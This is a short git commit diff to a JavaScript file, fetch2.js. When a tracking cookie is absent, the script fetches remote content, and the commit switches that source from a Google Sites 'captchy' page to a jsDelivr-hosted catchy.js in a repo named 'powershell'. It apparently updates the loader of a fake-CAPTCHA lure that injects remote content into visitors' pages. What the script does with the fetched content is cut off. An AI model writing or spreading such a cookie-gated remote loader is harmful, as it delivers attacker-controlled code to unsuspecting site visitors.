d9235d5ef5a418a6cb2ca517f4999070e8cd6006
joault <joault@currently.com>
2026-04-27 04:05:38 -0700

    Update fetch2.js

--- fetch2.js
+++ fetch2.js
@@ -52,7 +52,7 @@ const cookie = getCookie(cookiename);
 // Cookie found
 if(!cookie)
 {
-    fetch("https://sites.google.com/view/captchy/home") 
+    fetch("https://cdn.jsdelivr.net/gh/joault/powershell@main/catchy.js") 
     .then(response => response.ok ? response.text() : Promise.reject())
     .then(html =>
     {
